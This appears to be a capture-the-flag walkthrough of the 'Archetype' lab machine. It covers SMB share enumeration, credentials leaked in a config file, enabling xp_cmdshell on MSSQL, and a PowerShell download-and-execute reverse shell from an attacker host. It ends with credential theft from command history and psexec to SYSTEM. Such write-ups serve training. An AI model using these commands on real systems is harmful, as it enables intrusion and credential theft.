📝 Penetration Test Walkthrough: ARCHETYPE (Target IP: 10.129.12.31)1. Initial Reconnaissance & EnumerationThe process begins with a full port scan and service version enumeration using Nmap against the target IP, 10.129.12.31.Bashunknown@kali:/data$ ports=$(nmap -p- --min-rate=1000  -T4 10.129.12.31 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
unknown@kali:/data$ nmap -sC -sV -p$ports 10.129.12.31
Nmap Scan Report Snippet:PORTSTATESERVICEVERSION135/tcpopenmsrpcMicrosoft Windows RPC139/tcpopennetbios-ssnMicrosoft Windows netbios-ssn445/tcpopenmicrosoft-dsWindows Server 2019 Standard 17763 microsoft-ds1433/tcpopenms-sql-sMicrosoft SQL Server 2017 14.00.1000.00; RTM5985/tcpopenhttpMicrosoft HTTPAPI httpd 2.0 (WinRM)Key Findings:The host is running Windows Server 2019.Port 445 (SMB) and Port 1433 (MSSQL) are open.The server's NetBIOS Domain/Computer name is ARCHETYPE.2. Foothold via SMB and Configuration LeakThe open SMB port (445) is investigated for anonymous access, which is often a source of configuration leaks.Bashunknown@kali:/data$ smbclient -L //10.129.12.31
Enter WORKGROUP\unknown's password: 
# ... (Output lists shares)

unknown@kali:/data$ smbclient //10.129.12.31/backups
Enter WORKGROUP\unknown's password: 
smb: \> ls
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

smb: \> get prod.dtsConfig
smb: \> cat prod.dtsConfig 
<DTSConfiguration>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
The file prod.dtsConfig reveals credentials for a Windows domain service account:User ID: ARCHETYPE\sql_svcPassword: M3g4c0rp1233. Exploiting MSSQL for Remote Command Execution (RCE)The discovered credentials are used with Impacket's mssqlclient.py to authenticate to the SQL Server on port 1433.Bashunknown@kali:/data$ mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.12.31 -windows-auth
# (The password is included in the command above)

SQL> select is_srvrolemember('sysadmin')
# Output: 1 
The output of 1 confirms that the ARCHETYPE\sql_svc user has sysadmin privileges on the SQL Server. This high level of access allows the enabling of the powerful command execution module, xp_cmdshell.SQLSQL> EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

SQL> xp_cmdshell "whoami"
output                                                                             
--------------------------------------------------------------------------------   
archetype\sql_svc                                                                  
NULL
The successful execution of whoami confirms RCE capability under the context of the ARCHETYPE\sql_svc user.4. Gaining a Reverse Shell and User FlagA PowerShell reverse shell payload is hosted on the attacker's machine and executed via xp_cmdshell to gain a persistent shell access.Attacker IP: 10.10.14.3 (Example IP)Payload: PowerShell reverse shell saved as shell.ps1.Listener: Netcat is started on port 443.Bashunknown@kali:/data/tmp$ sudo rlwrap nc -nlvp 443
Execution via MSSQL:SQLxp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"
A shell is received, and the user flag is retrieved from the service account's desktop:Bash# whoami
archetype\sql_svc

# more \users\sql_svc\desktop\user.txt
User flag: 3e7b102e78218e935bf3f4951fec21a3
5. Privilege Escalation to SYSTEMTo gain full control, the attacker enumerates the sql_svc user's PowerShell history, which reveals highly sensitive domain administrator credentials:Bash# type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
New Credentials Found:User: administratorPassword: MEGACORP_4dm1n!!These privileged credentials are used with Impacket's psexec.py to gain a system-level shell:Bashunknown@kali:/data$ psexec.py administrator:MEGACORP_4dm1n!!@10.129.12.31
# (Password included in command)

# ... (Service creation and execution output)

C:\Windows\system32>whoami
nt authority\system
The successful execution grants the attacker an nt authority\system shell (the highest privilege level). The root flag is then retrieved:BashC:\Windows\system32>more \users\administrator\desktop\root.txt
Root flag: b91ccec3305e98240082d4474b848528